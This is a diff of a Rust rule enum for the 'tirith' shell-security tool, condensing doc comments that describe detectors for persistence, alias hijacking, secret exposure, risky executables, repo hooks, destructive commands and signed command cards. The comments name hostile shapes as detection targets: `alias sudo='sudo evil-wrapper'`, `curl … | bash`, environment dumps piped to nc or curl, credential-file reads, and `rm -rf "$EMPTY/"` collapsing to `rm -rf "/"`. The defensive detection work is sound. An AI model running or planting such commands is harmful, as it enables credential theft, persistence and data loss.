+    // `tirith persistence diff|watch` snapshot comparison (`crate::persistence`),
+    // never the hot path; detect a CHANGE vs a recorded snapshot, no PATTERN_TABLE
+    // entry, live in `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in `persistence.rs`.
+    /// M9 ch2 — a shell rc/profile changed (sha256 differs) since the snapshot.
+    /// Medium — a classic persistence foothold.
     PersistenceShellRcModified,
-    /// M9 ch2 — a new line was added to `~/.ssh/authorized_keys` since the
-    /// recorded snapshot. High severity — an added authorized key is a
-    /// direct remote-access backdoor.
+    /// M9 ch2 — a new line added to `~/.ssh/authorized_keys`. High — a direct
+    /// remote-access backdoor.
     PersistenceAuthorizedKeysNewEntry,
-    /// M9 ch2 — the user crontab (`crontab -l`) changed since the recorded
-    /// snapshot. Medium severity — cron is a common scheduled-execution
-    /// persistence channel.
+    /// M9 ch2 — the user crontab (`crontab -l`) changed. Medium — a scheduled-
+    /// execution persistence channel.
     PersistenceCrontabModified,
-    /// M9 ch2 — a launchd / systemd-user unit was added (a new
-    /// `~/Library/LaunchAgents/*.plist` or `~/.config/systemd/user/*.service`
-    /// not present in the snapshot). High severity — a new agent/unit runs
-    /// code at login / on a schedule.
+    /// M9 ch2 — a launchd/systemd-user unit was added (new `*.plist` /
+    /// `*.service`). High — runs code at login / on a schedule.
     PersistenceLaunchAgentAdded,
-    /// M9 ch2 — `~/.ssh/config` gained an `Include` directive since the
-    /// recorded snapshot. Medium severity — an added Include can pull in an
-    /// attacker-controlled SSH config fragment.
+    /// M9 ch2 — `~/.ssh/config` gained an `Include`. Medium — can pull in an
+    /// attacker-controlled config fragment.
     PersistenceSshConfigInclude,
-    /// M9 ch2 — a new `.envrc` (direnv) appeared in the cwd ancestry since
-    /// the recorded snapshot. Medium severity — direnv auto-sources `.envrc`
-    /// on `cd`, so a new file is auto-executed code.
+    /// M9 ch2 — a new `.envrc` (direnv) appeared in the cwd ancestry. Medium —
+    /// direnv auto-sources it on `cd`.
     PersistenceDirenvNewEnvrc,
 
-    // Shell-alias / function risk rules (M9 ch3). These fire ONLY from the
-    // `tirith aliases scan|explain` parser (`crate::aliases`), which reads
-    // shell rc/profile files statically (and, opt-in, shells out with no-rc
-    // flags), never from the `engine::analyze` exec/paste hot path or
-    // `analyze_output`. They classify *parsed alias/function bodies*, so they
-    // carry no PATTERN_TABLE entry and live in `EXTERNALLY_TRIGGERED_RULES`.
-    // Covered by unit tests in `aliases.rs` against a `tempfile::tempdir()`
-    // root (always with `include_runtime=false` to keep CI hermetic).
-    /// M9 ch3 — an alias or function shadows a critical command
-    /// (`ls`, `cd`, `git`, `ssh`, `sudo`, `npm`, `pip`, `docker`, `kubectl`,
-    /// `aws`). Medium severity — overriding a trusted command is a classic way
-    /// to interpose a wrapper that exfiltrates arguments or alters behavior
-    /// (e.g. `alias sudo='sudo evil-wrapper'`).
+    // Shell-alias / function risk rules (M9 ch3). Fire ONLY from the
+    // `tirith aliases scan|explain` parser (`crate::aliases`), which reads rc
+    // files statically (opt-in shell-out), never the hot path; classify parsed
+    // alias/function bodies, no PATTERN_TABLE entry, live in
+    // `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in `aliases.rs`
+    // (`include_runtime=false` for CI hermeticity).
+    /// M9 ch3 — an alias/function shadows a critical command (`ls`, `git`,
+    /// `sudo`, `docker`, …). Medium — interposes a wrapper that can exfiltrate
+    /// args (`alias sudo='sudo evil-wrapper'`).
     AliasOverridesCriticalCommand,
-    /// M9 ch3 — an alias/function body makes a network call (`curl`, `wget`,
-    /// `nc`/`ncat`/`netcat`). High severity — a network call hidden inside an
-    /// everyday alias is a stealthy exfiltration / download-execute channel
-    /// that fires whenever the alias is invoked.
+    /// M9 ch3 — an alias/function body makes a network call (`curl`/`wget`/`nc`).
+    /// High — a stealthy exfil / download-execute channel.
     AliasContainsNetworkCall,
     /// M9 ch3 — an alias/function body reads a credential file
-    /// (`~/.aws/credentials`, `~/.ssh/id_*`, `~/.netrc`, `~/.npmrc`, etc.).
-    /// High severity — an alias that quietly reads your secrets every time you
-    /// run it is a credential-theft foothold.
+    /// (`~/.aws/credentials`, `~/.ssh/id_*`, `~/.netrc`, …). High — a
+    /// credential-theft foothold.
     AliasContainsCredentialRead,
-    /// M9 ch3 — the rc file an alias/function was defined in was modified
-    /// within the last hour (file mtime). Info severity — surfaces a
-    /// *recently-added* alias for review (a freshly-planted malicious alias),
-    /// without claiming the alias itself is malicious.
+    /// M9 ch3 — the rc file an alias was defined in was modified within the last
+    /// hour. Info — surfaces a recently-added alias for review.
     AliasRecentlyAdded,
 
-    // Environment-variable lifecycle rules (M9 ch4). Two fire from the
-    // `engine::analyze` exec hot path (gated behind `policy.env_guard_enabled`);
-    // one fires only from `tirith env guard` over the rc-file scan. The
-    // sensitive-variable list is the SAME `assets/data/sensitive_env.toml`
-    // list the M6 ch5 env-scrub transform uses. See `crate::env_guard`.
-    /// M9 ch4 — a sensitive env var (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`,
-    /// …) is currently set AND the command pipes remote content into a shell
-    /// interpreter (`curl … | bash`, `wget … | sh`). A malicious script
-    /// inherits and can exfiltrate the secret. High severity. **This is the
-    /// dedicated rule the M6 ch5 env-scrub `safe_command` transform attaches
-    /// to** — when this finding is present, the env-scrub rewrite fires under
-    /// this rule_id (the generic "any High finding" heuristic is retained for
-    /// backward compat). Tier-1 rides the existing pipe-to-interpreter
-    /// patterns; the std::env check is wired in `engine.rs`. Unit-tested via a
-    /// `&[String]` of currently-set sensitive names (no std::env mutation).
+    // Environment-variable lifecycle rules (M9 ch4). Two fire from the exec hot
+    // path (gated by `policy.env_guard_enabled`); one only from `tirith env guard`.
+    // Sensitive-var list is the same `sensitive_env.toml` M6 ch5 env-scrub uses.
+    /// M9 ch4 — a sensitive env var is set AND the command pipes remote content
+    /// into a shell (`curl … | bash`); the script inherits and can exfiltrate it.
+    /// High. This is the dedicated rule the M6 ch5 env-scrub `safe_command`
+    /// transform attaches to. Tier-1 rides the pipe-to-interpreter patterns; the
+    /// std::env check is wired in `engine.rs`.
     EnvSensitiveExposedToUnknownScript,
-    /// M9 ch4 — a sensitive env var is `export`ed in a shell rc/profile
-    /// (`~/.bashrc`, `~/.zshrc`, …). High severity — a credential persisted in
-    /// shell config leaks into every shell and is a common exfiltration target.
-    /// Fires only from the `tirith env guard` rc-file scan
-    /// (`crate::env_guard`), never the exec hot path → `EXTERNALLY_TRIGGERED`.
+    /// M9 ch4 — a sensitive env var `export`ed in a shell rc/profile. High — leaks
+    /// into every shell. Fires only from `tirith env guard` → `EXTERNALLY_TRIGGERED`.
     EnvSensitivePersistedInShellRc,
-    /// M9 ch4 — `printenv` / `env` (with no command argument) piped into a
-    /// network sink (`curl`, `wget`, `nc`). Medium severity — dumps every
-    /// environment variable, including any secrets, off the machine. Fires
-    /// from the exec hot path under `policy.env_guard_enabled`; tier-1 gate is
-    /// the `env_to_network_sink` PATTERN_TABLE entry.
+    /// M9 ch4 — `printenv`/`env` (no command arg) piped into a network sink. Medium
+    /// — dumps every var off the machine. Hot path under `env_guard_enabled`;
+    /// tier-1 gate is `env_to_network_sink`.
     EnvPrintenvToNetworkSink,
 
-    // Executable-provenance + PATH-shadowing rules (M9 ch5). Split into a
-    // CHEAP hot-path subset and an EXPENSIVE off-hot-path subset.
+    // Executable-provenance + PATH-shadowing rules (M9 ch5). Split into a CHEAP
+    // hot-path subset and an EXPENSIVE off-hot-path subset.
     //
-    // HOT PATH (3 rules) — fire from `engine::analyze` (Exec context) ONLY when
-    // `policy.exec_guard_enabled` is set. They are stat-free string compares
-    // against the resolved leader's path (no `stat`, no `codesign`, no shell-
-    // out): is the leader inside (i) `/tmp`, (ii) the current repo, or (iii) a
-    // user-writable repo-local/`/tmp` `$PATH` dir that precedes a system dir.
-    // Producers live in `crate::path_audit`. They carry no PATTERN_TABLE entry
-    // (the leader-path check is not a regex match) and live in
-    // `EXTERNALLY_TRIGGERED_RULES`, covered by unit tests in `path_audit.rs`
-    // plus `command.toml` fixtures that exercise the no-fire default-policy
-    // path.
+    // HOT (3) — fire from `engine::analyze` ONLY when `policy.exec_guard_enabled`;
+    // stat-free string compares on the resolved leader path. No PATTERN_TABLE
+    // entry; in `EXTERNALLY_TRIGGERED_RULES`. Producers in `crate::path_audit`;
+    // unit-tested plus `command.toml` no-fire fixtures.
     //
-    // OFF HOT PATH (7 rules) — fire ONLY from explicit `tirith exec
-    // check|provenance` / `tirith path audit|which`. They stat the file
-    // (mtime / mode / uid-gid), shell out to `file --brief` and `codesign
-    // --verify` (macOS, 2s timeout via `util::run_shell_with_timeout`), and
-    // compare against package-manager paths. NEVER reached from the hot path.
-    // Producers live in `crate::exec_provenance` / `crate::path_audit`; covered
-    // by unit tests with temp-dir entry points.
-    /// M9 ch5 (HOT) — the resolved command leader lives under `/tmp` (or
-    /// `$TMPDIR`). Medium severity — a binary in a world-writable scratch dir
-    /// is a classic drop-and-run staging location. Stat-free path check.
+    // COLD (7) — fire ONLY from explicit `tirith exec check|provenance` /
+    // `tirith path audit|which`; they stat the file and shell out to `file` /
+    // `codesign` (2s timeout). NEVER reached from the hot path. Producers in
+    // `crate::exec_provenance` / `crate::path_audit`.
+    /// M9 ch5 (HOT) — leader lives under `/tmp` (or `$TMPDIR`). Medium — a
+    /// drop-and-run staging location. Stat-free.
     ExecInTmp,
-    /// M9 ch5 (COLD) — the executable was modified within the last 5 minutes
-    /// (mtime). High severity — a freshly-written binary about to be executed
-    /// is the signature of a just-dropped payload. Fires only from
-    /// `tirith exec check|provenance` (stats the file).
+    /// M9 ch5 (COLD) — executable modified within the last 5 min. High — the
+    /// signature of a just-dropped payload.
     ExecRecentlyModified,
-    /// M9 ch5 (COLD) — the executable is world-writable (`mode & 0o002 != 0`).
-    /// High severity — any local process can replace it before the next run.
-    /// Fires only from `tirith exec check|provenance` (stats the file).
+    /// M9 ch5 (COLD) — executable world-writable (`mode & 0o002 != 0`). High — any
+    /// local process can replace it.
     ExecWorldWritable,
-    /// M9 ch5 (COLD) — the resolved binary shadows a system command of the
-    /// same name that also exists in a system dir (`/usr/bin`, `/bin`,
-    /// `/usr/sbin`, `/sbin`), and the resolved one is NOT the system copy.
-    /// Medium severity. Fires only from `tirith exec check` / `tirith path
-    /// which` (resolves the full PATH).
+    /// M9 ch5 (COLD) — the resolved binary shadows a system command of the same
+    /// name and is NOT the system copy. Medium.
     ExecShadowsSystemCommand,
-    /// M9 ch5 (COLD) — the executable carries no valid code signature
-    /// (`codesign --verify` fails on macOS; Authenticode absent on Windows).
-    /// Medium severity, macOS/Windows only — a no-op on Linux (no platform
-    /// signing baseline). Fires only from `tirith exec check|provenance`
-    /// (2s `codesign` shell-out, NEVER hot path).
+    /// M9 ch5 (COLD) — executable has no valid code signature. Medium,
+    /// macOS/Windows only (no-op on Linux). 2s `codesign` shell-out, never hot path.
     ExecUnsigned,
-    /// M9 ch5 (HOT) — the resolved command leader lives inside the current
-    /// repo's working tree (e.g. `./node_modules/.bin/<x>`, `./scripts/<x>`).
-    /// Medium severity — running a repo-checked-in binary executes code an
-    /// attacker can land via a PR. Stat-free path check.
+    /// M9 ch5 (HOT) — leader lives inside the current repo working tree (e.g.
+    /// `./node_modules/.bin/<x>`). Medium — runs code an attacker can land via a
+    /// PR. Stat-free.
     ExecInRepoBin,
-    /// M9 ch5 (HOT) — a `$PATH` entry that the current user can WRITE precedes
-    /// a system dir (`/usr/bin`, `/bin`, `/usr/sbin`) AND is repo-local or
-    /// under `/tmp`, and the resolved leader is found there. High severity —
-    /// a writable dir ahead of the system path lets any local process shadow
-    /// every system command. Repo-local / `/tmp` focused to avoid flagging the
-    /// near-universal `~/.local/bin` (Intel-macOS `/usr/local/bin` is
-    /// world-writable by default — see module doc). Stat-free string compare
-    /// of `$PATH` ordering + a `libc::access(W_OK)` writability probe.
+    /// M9 ch5 (HOT) — a user-writable, repo-local or `/tmp` `$PATH` entry precedes
+    /// a system dir and the leader resolves there. High. Repo-local/`/tmp` focused
+    /// to avoid flagging `~/.local/bin` (see module doc). Stat-free + a
+    /// `libc::access(W_OK)` probe.
     PathWritableDirBeforeSystem,
-    /// M9 ch5 (COLD) — the same command name resolves in more than one `$PATH`
-    /// dir (PATH duplicate). Medium severity — surfaces shadowing ambiguity.
-    /// Fires only from `tirith path audit`.
+    /// M9 ch5 (COLD) — a command name resolves in more than one `$PATH` dir.
+    /// Medium — shadowing ambiguity. `tirith path audit` only.
     PathDuplicateCommandName,
-    /// M9 ch5 (COLD) — a `$PATH` entry resolves inside the current repo's
-    /// working tree. Medium severity. Fires only from `tirith path audit`
-    /// (the hot-path equivalent is `ExecInRepoBin`, scoped to the resolved
-    /// leader rather than enumerating the whole PATH).
+    /// M9 ch5 (COLD) — a `$PATH` entry resolves inside the repo. Medium. `tirith
+    /// path audit` only (the hot-path equivalent is `ExecInRepoBin`).
     PathDirInRepo,
-    /// M9 ch5 (COLD) — a `$PATH` entry is under `/tmp` (or `$TMPDIR`). High
-    /// severity — a scratch dir on PATH means anything dropped there shadows
-    /// real commands. Fires only from `tirith path audit`.
+    /// M9 ch5 (COLD) — a `$PATH` entry under `/tmp` (or `$TMPDIR`). High —
+    /// anything dropped there shadows real commands. `tirith path audit` only.
     PathDirInTmp,
 
-    // Repo-hook / automation guard rules (M9 ch6). These fire from the
-    // `crate::repo_hooks` scanner that powers `tirith hooks scan|guard|explain`.
-    // The scanner classifies a hook BODY (a `.git/hooks/*`, `.husky/*`,
-    // `lefthook.yml`, `.pre-commit-config.yaml`, `package.json` lifecycle script,
-    // `.envrc`, `Makefile`/`justfile`/`Taskfile`, `mise`/`asdf` hook) as text —
-    // it never executes the hook. Three of the five (network / credential / sudo)
-    // can also surface on the `engine::analyze` exec hot path when a hot-path
-    // git / package-manager command runs in a repo whose triggered hooks carry
-    // them, gated behind `policy.hooks_guard_enabled` (default false). The
-    // trigger is repo STATE + a hot-path command, not a regex on the user's
-    // input, so they carry no PATTERN_TABLE entry and live in
-    // `EXTERNALLY_TRIGGERED_RULES`. Covered by unit tests in
-    // `crates/tirith-core/src/repo_hooks.rs` against `tempfile::tempdir()` roots.
-    /// M9 ch6 — a hook body makes a network call (`curl` / `wget` / `nc` /
-    /// `ncat` / `netcat` as a command word). High severity — a network call
-    /// inside a hook that fires on `git commit` / `npm install` is a stealthy
-    /// download-execute / exfiltration channel.
+    // Repo-hook / automation guard rules (M9 ch6). Fire from the
+    // `crate::repo_hooks` scanner (`tirith hooks scan|guard|explain`), which
+    // classifies a hook BODY (`.git/hooks/*`, `.husky/*`, lifecycle scripts,
+    // `.envrc`, Make/just/Taskfile, …) as text and never executes it. Three
+    // (network/credential/sudo) also surface on the exec hot path when a git /
+    // package-manager command runs in a repo with triggered hooks, gated by
+    // `policy.hooks_guard_enabled`. No PATTERN_TABLE entry;
+    // `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in `repo_hooks.rs`.
+    /// M9 ch6 — a hook body makes a network call (`curl`/`wget`/`nc`). High — a
+    /// stealthy download-execute / exfil channel firing on commit/install.
     RepoHookNetworkCall,
-    /// M9 ch6 — a hook body reads a credential file / dir (`~/.aws`, `~/.ssh`,
-    /// `.env`, `~/.npmrc`, `~/.git-credentials`, …). High severity — a hook that
-    /// reads your secrets every commit/install is a credential-theft foothold.
+    /// M9 ch6 — a hook body reads a credential file/dir (`~/.aws`, `~/.ssh`,
+    /// `.env`, …). High — a credential-theft foothold.
     RepoHookCredentialRead,
-    /// M9 ch6 — a hook body uses `sudo`. High severity — privilege escalation
-    /// triggered automatically by an everyday git / package-manager command.
+    /// M9 ch6 — a hook body uses `sudo`. High — auto-triggered privilege escalation.
     RepoHookSudo,
-    /// M9 ch6 — a hook body pipes into a shell interpreter (`… | sh`), decodes
-    /// base64 then executes, or uses `eval`. Medium severity — the classic
-    /// obfuscated-payload shape, but heuristic, so it does not block by default.
+    /// M9 ch6 — a hook body pipes into a shell, base64-decodes then executes, or
+    /// uses `eval`. Medium — the obfuscated-payload shape; heuristic.
     RepoHookSuspiciousShellPattern,
-    /// M9 ch6 — a hook body fetches an external resource: a bare `http(s)://`
-    /// URL, or a remote-package runner (`npx` / `pnpm dlx`). Medium severity —
-    /// reaching out to the network during a hook is worth surfacing even when it
-    /// is not a raw `curl | sh`.
+    /// M9 ch6 — a hook body fetches an external resource (bare `http(s)://` URL or
+    /// a remote-package runner `npx`/`pnpm dlx`). Medium.
     RepoHookExternalFetch,
 
     // Blast-radius rules (M10 ch1). Split into a CHEAP hot-path subset and a
     // SIMULATOR-ONLY subset.
     //
-    // HOT PATH (4 rules) — fire from `engine::analyze` (Exec context) via the
-    // CHEAP, filesystem-free `blast_radius::cheap_check` when the parsed leader
-    // is `rm|mv|chmod|find … -delete|rsync --delete` and a target is dangerous
-    // by STRING SHAPE alone. They are pure string compares + an injected env-map
-    // lookup (no `stat`, no walk, no glob expansion). Tier-1 gate is the
-    // `destructive_fs_op` PATTERN_TABLE entry. These four have `command.toml`
-    // fixtures: `BlastWritesSystemPath`, `BlastEmptyVarGlob`, `BlastFindDelete`,
-    // `BlastRsyncDelete`.
+    // HOT (4) — fire from `engine::analyze` via the filesystem-free
+    // `blast_radius::cheap_check` when the leader is `rm|mv|chmod|find
+    // -delete|rsync --delete` and a target is dangerous by STRING SHAPE (pure
+    // string compares + an injected env-map lookup). Tier-1 gate is
+    // `destructive_fs_op`; all four have `command.toml` fixtures.
     //
-    // SIMULATOR-ONLY (3 rules) — fire ONLY from explicit
-    // `tirith preview -- "<cmd>"` via `blast_radius::simulate` +
-    // `report_findings`, which WALK THE FILESYSTEM (depth ≤ 5, ≤ 100k files),
-    // expand globs against cwd, and count files/dirs/symlinks. They are NEVER
-    // reachable from the `tirith check` hot path, so they carry no static
-    // fixture and live in `EXTERNALLY_TRIGGERED_RULES`, covered by unit tests in
-    // `blast_radius.rs` against `tempfile::tempdir()` trees:
-    // `BlastDeletesOutsideRepo`, `BlastSymlinkTraversal`, `BlastLargeFileCount`.
-    /// M10 ch1 (SIMULATOR-ONLY) — a `tirith preview` simulation resolved at
-    /// least one destructive target outside the repository root (or above the
-    /// cwd when no repo root is known). High severity. Never fires on the hot
-    /// path — the filesystem walk that resolves the target tree runs only under
-    /// `tirith preview`.
+    // SIMULATOR-ONLY (3) — fire ONLY from `tirith preview` via
+    // `blast_radius::simulate`, which WALKS the filesystem (depth ≤ 5, ≤ 100k
+    // files). Never on the hot path; no fixture, `EXTERNALLY_TRIGGERED_RULES`.
+    // Unit-tested in `blast_radius.rs`.
+    /// M10 ch1 (SIM) — a `tirith preview` resolved a destructive target outside
+    /// the repo root (or above cwd). High. Never on the hot path.
     BlastDeletesOutsideRepo,
-    /// M10 ch1 (HOT) — a destructive command (`rm`/`mv`/`chmod -R`/`find
-    /// -delete`/`rsync --delete`) targets a broad system path (`/`, `/home`,
-    /// `/usr`, `/etc`, `~`, …) by string shape alone. High severity. Cheap,
-    /// filesystem-free string compare on the hot path.
+    /// M10 ch1 (HOT) — a destructive command targets a broad system path (`/`,
+    /// `/home`, `/usr`, `/etc`, `~`, …) by string shape. High.
     BlastWritesSystemPath,
-    /// M10 ch1 (SIMULATOR-ONLY) — a `tirith preview` simulation found symlinks
-    /// in the destructive target tree (counted, never followed). Medium
-    /// severity — a tool may traverse a link and reach files outside the visible
-    /// tree. Requires the filesystem walk, so it never fires on the hot path.
+    /// M10 ch1 (SIM) — `tirith preview` found symlinks in the target tree
+    /// (counted, never followed). Medium — a tool may reach outside the tree.
     BlastSymlinkTraversal,
-    /// M10 ch1 (HOT) — a destructive command targets a `"$VAR/"`-shaped path
-    /// where `VAR` resolves to empty (`rm -rf "$EMPTY/"` with `EMPTY` unset →
-    /// `rm -rf "/"`). **Severity depends on what tirith can see (F2):** High when
-    /// `VAR` is PRESENT-and-empty in tirith's env-map (an unambiguous collapse);
-    /// Info when `VAR` is merely ABSENT, because it could be a benign
-    /// non-exported shell-local that IS set — tirith cannot observe shell-locals,
-    /// so it must not BLOCK the ambiguous case. Detected against an injected
-    /// env-map (the hot path snapshots `std::env` once and passes it in), so the
-    /// detector is pure and the present-empty case is unit-testable without an
-    /// env mutation. A leading `sudo`/`doas` is unwrapped before matching (C1).
+    /// M10 ch1 (HOT) — a destructive command targets a `"$VAR/"` path where `VAR`
+    /// is empty (`rm -rf "$EMPTY/"` → `rm -rf "/"`). Severity by visibility (F2):
+    /// High when `VAR` is PRESENT-and-empty in the env-map, Info when merely
+    /// ABSENT (could be a set shell-local tirith can't observe). Pure (injected
+    /// env-map); leading `sudo`/`doas` unwrapped (C1).
     BlastEmptyVarGlob,
-    /// M10 ch1 (HOT) — `find … -delete` recursively unlinks every matching
-    /// entry. Medium severity. Surfaced by string shape on the hot path; run
+    /// M10 ch1 (HOT) — `find … -delete` recursively unlinks matches. Medium. Run
     /// `tirith preview` for the file count.
     BlastFindDelete,
-    /// M10 ch1 (HOT) — `rsync --delete` prunes destination files not present in
-    /// the source. Medium severity. A wrong source/dest pair wipes the
-    /// destination. Surfaced by string shape on the hot path.
+    /// M10 ch1 (HOT) — `rsync --delete` prunes destination files; a wrong
+    /// source/dest pair wipes the destination. Medium.
     BlastRsyncDelete,
-    /// M10 ch1 (SIMULATOR-ONLY) — a `tirith preview` simulation counted more
-    /// than 1000 files in the destructive target tree. Info severity (never
-    /// blocks). Requires the filesystem walk, so it never fires on the hot path.
+    /// M10 ch1 (SIM) — `tirith preview` counted > 1000 files in the target tree.
+    /// Info (never blocks). Never on the hot path.
     BlastLargeFileCount,
 
     /// M10 ch2 (RUNTIME-STATE) — a `tirith watch -- <cmd>` run modified a shell
-    /// rc / profile file (`~/.bashrc`, `~/.zshrc`, `~/.profile`, fish /
-    /// PowerShell profiles) DURING the watched command. High severity: a command
-    /// you ran to "install a tool" quietly rewriting your login shell is the
-    /// classic persistence foothold. Fires only from the `tirith watch` post-run
-    /// diff (snapshot → run → snapshot), never from the `tirith check` hot path,
-    /// so it carries no PATTERN_TABLE entry and lives in
-    /// `EXTERNALLY_TRIGGERED_RULES`, covered by a unit test in
-    /// `crates/tirith/src/cli/checkpoint.rs`.
+    /// rc/profile DURING the watched command. High — a "install a tool" command
+    /// rewriting your login shell is the classic persistence foothold. Fires only
+    /// from the `tirith watch` post-run diff; `EXTERNALLY_TRIGGERED_RULES`,
+    /// unit-tested in `cli/checkpoint.rs`.
     PostRunShellRcModified,
 
-    // Tainted-content tracking rules (M10 ch3). These fire from
-    // `engine::analyze` (Exec context) when the parsed command's leader (or, for
-    // `source`/`.`, the sourced file argument) is a path recorded as tainted in
-    // the JSONL store at `state_dir()/taint.jsonl` (`crate::taint`). A file
-    // becomes tainted via `tirith fetch --save <path> <url>` (a downloaded file
-    // kept at a known path). The lookup is a per-leader path-key match against a
-    // per-process-cached store; when the store is empty/absent the engine never
-    // forces past its tier-1 fast-exit for the check, so a machine that has
-    // never marked a file pays nothing. They carry no PATTERN_TABLE entry (the
-    // trigger is runtime state + a path the user typed, not a regex on the
-    // input) and live in `EXTERNALLY_TRIGGERED_RULES`, covered by unit tests in
-    // `crates/tirith-core/src/taint.rs` against a `tempfile::tempdir()` store.
-    /// M10 ch3 — the parsed command leader is a path recorded as tainted
-    /// (downloaded from a risky source via `tirith fetch --save`). High
-    /// severity: executing a freshly-downloaded-from-untrusted-source file is
-    /// the exact flow this tracking exists to surface (`bash ./install.sh`
-    /// after `tirith fetch --save ./install.sh https://untrusted.example/…`).
-    /// The mark persists until an explicit `tirith taint clear` — it is NOT
-    /// auto-cleared by `chmod +x` or a `bash -n` parse check.
+    // Tainted-content tracking rules (M10 ch3). Fire from `engine::analyze` when
+    // the leader (or, for `source`/`.`, the sourced file) is a path recorded as
+    // tainted in `state_dir()/taint.jsonl` (`crate::taint`). A file becomes
+    // tainted via `tirith fetch --save <path> <url>`. An empty/absent store never
+    // forces past the tier-1 fast-exit, so an unused machine pays nothing. No
+    // PATTERN_TABLE entry; `EXTERNALLY_TRIGGERED_RULES`. Unit-tested in `taint.rs`.
+    /// M10 ch3 — the command leader is a path recorded as tainted (downloaded via
+    /// `tirith fetch --save`). High — executing a freshly-downloaded file is the
+    /// flow this exists to surface. The mark persists until `tirith taint clear`
+    /// (NOT auto-cleared by `chmod +x` or `bash -n`).
     ExecOfTaintedFile,
-    /// M10 ch3 — a `source ./tainted.sh` / `. ./tainted.sh` sources a file
-    /// recorded as tainted. Medium severity (best-effort): sourcing runs the
-    /// file's commands in the current shell, but the `source`/`.` builtin shape
-    /// is only matched when it is the command leader, so this is a narrower,
+    /// M10 ch3 — `source`/`.` of a tainted file. Medium (best-effort): the
+    /// `source`/`.` shape is matched only as the leader, so a narrower,
     /// lower-confidence signal than `ExecOfTaintedFile`.
     CommandSourcedFromTaintedFile,
 
-    // Anomaly-detection rules (M10 ch5, design-decision D2). These fire from
-    // `engine::analyze` (any context) ONLY when `policy.baseline_enabled` is set
-    // (opt-in, default false) AND some other detection rule already fired: the
-    // engine looks up the firing finding's privacy-hashed tuple
-    // `(rule_id, host_hash, ecosystem, sudo_flag, cwd_repo_hash)` in the sliding
-    // window at `state_dir()/baseline.jsonl` (`crate::baseline`) and, if the
-    // pattern is new / rare for this user, appends one of these Info findings.
-    // The observation is recorded regardless. They carry no PATTERN_TABLE entry
-    // (the trigger is runtime baseline STATE plus another finding, not a regex /
-    // byte signal on the input) and live in `EXTERNALLY_TRIGGERED_RULES`,
-    // covered by unit tests in `crate::baseline` against a `tempfile::tempdir()`
-    // store. Privacy: the store records salted-sha256 hashes, NEVER raw
-    // hostnames or paths — see the `baseline` module doc.
-    /// M10 ch5 — the privacy-hashed tuple of a firing finding has never been
-    /// seen in this user's baseline window (`count == 0`). Info severity: it
-    /// annotates "this is new for you" and never changes the action. Only
-    /// emitted when `policy.baseline_enabled` is on.
+    // Anomaly-detection rules (M10 ch5, D2). Fire from `engine::analyze` ONLY
+    // when `policy.baseline_enabled` (opt-in) AND another rule already fired: the
+    // firing finding's privacy-hashed tuple `(rule_id, host_hash, ecosystem,
+    // sudo_flag, cwd_repo_hash)` is looked up in the sliding window at
+    // `state_dir()/baseline.jsonl` and, if new/rare, an Info finding is appended
+    // (the observation is recorded regardless). No PATTERN_TABLE entry;
+    // `EXTERNALLY_TRIGGERED_RULES`. Privacy: the store holds salted-sha256 hashes,
+    // NEVER raw hostnames/paths — see the `baseline` module doc.
+    /// M10 ch5 — the firing finding's tuple has never been seen in this user's
+    /// baseline window (`count == 0`). Info — annotates "new for you", never
+    /// changes the action. Only when `baseline_enabled`.
     AnomalyFirstTimeInThisRepo,
-    /// M10 ch5 — the tuple has been seen before but rarely (`0 < count < 3`) in
-    /// the baseline window. Info severity. Only emitted when
-    /// `policy.baseline_enabled` is on.
+    /// M10 ch5 — the tuple has been seen rarely (`0 < count < 3`). Info. Only when
+    /// `baseline_enabled`.
     AnomalyRareInBaseline,
 
     // Command-card rules (M11 ch1). A command card is an ed25519-signed
-    // attestation of what a command does (`crate::command_card`). These fire
-    // from `engine::analyze` (Exec context) when a card reference is supplied
-    // via the `--card <path>` sidecar flag or a leading
-    // `# tirith-card: <local-path>` shell comment. The card is ALWAYS read
-    // from disk — no remote URL is fetched on the hot path (a URL-shaped
-    // `# tirith-card:` value emits a "fetch first" warning, never a fetch).
-    // v1 is attestation-only: a verified card does NOT suppress or change any
-    // other finding's action/severity (no `expected_suppressed_rules`, no
-    // suppression allowlist — that is a deferred v2 candidate). Because
-    // verification needs runtime state (a signed card file + a trusted pubkey
-    // under `~/.config/tirith/trusted-card-keys/`), these live in
-    // `EXTERNALLY_TRIGGERED_RULES` and are covered by unit tests in
-    // `command_card.rs` plus a CLI integration test, rather than static
-    // golden fixtures.
-    /// M11 ch1 — a trusted, unexpired command card signed the EXACT command
-    /// being run. Info severity — improves audit confidence but does NOT
-    /// change the verdict (other findings still apply unchanged). Emitted ONLY
-    /// for a genuine verification (a Match). A card that is present but could
-    /// not be verified surfaces under [`RuleId::CommandCardUnverified`], NOT
-    /// this rule — so a consumer counting `command_card_verified` never
-    /// miscounts a FAILED verification as a verified one.
+    // attestation of what a command does (`crate::command_card`). Fire from
+    // `engine::analyze` when a card is supplied via `--card <path>` or a leading
+    // `# tirith-card: <local-path>` comment. The card is ALWAYS read from disk —
+    // a URL-shaped value emits a "fetch first" warning, never a fetch. v1 is
+    // attestation-only: a verified card does NOT suppress or change any other
+    // finding (v2 candidate). Needs runtime state (signed card + trusted pubkey
+    // under `~/.config/tirith/trusted-card-keys/`), so `EXTERNALLY_TRIGGERED_RULES`;
+    // unit-tested in `command_card.rs` plus a CLI integration test.
+    /// M11 ch1 — a trusted, unexpired card signed the EXACT command. Info —
+    /// improves audit confidence but does NOT change the verdict. Emitted ONLY for
+    /// a genuine Match; a present-but-unverified card uses
+    /// [`RuleId::CommandCardUnverified`], so a `command_card_verified` counter
+    /// never miscounts a failed verification.
     CommandCardVerified,
-    /// M11 ch1 — a command card was supplied (sidecar `--card` or a
-    /// `# tirith-card:` comment) but could NOT be verified: an untrusted key,
-    /// a bad signature, an UNSIGNED card, an expired card, a malformed/unreadable
-    /// card file, or a remote URL that v1 will not fetch on the hot path. Info
-    /// severity — a diagnostic note that does NOT claim trust and does NOT change
-    /// the verdict. A SUPPLIED unsigned card DOES surface this note (the card ref
-    /// resolved, so the unsigned outcome belongs in audit/JSON); only an entirely
-    /// card-LESS command is silent on this axis.
+    /// M11 ch1 — a card was supplied but could NOT be verified (untrusted key, bad
+    /// signature, unsigned, expired, unreadable, or a remote URL v1 won't fetch).
+    /// Info — a diagnostic note that claims no trust. A supplied unsigned card DOES
+    /// surface this; only a card-LESS command is silent.
     CommandCardUnverified,
-    /// M11 ch1 — a trusted command card was found, but the command being run
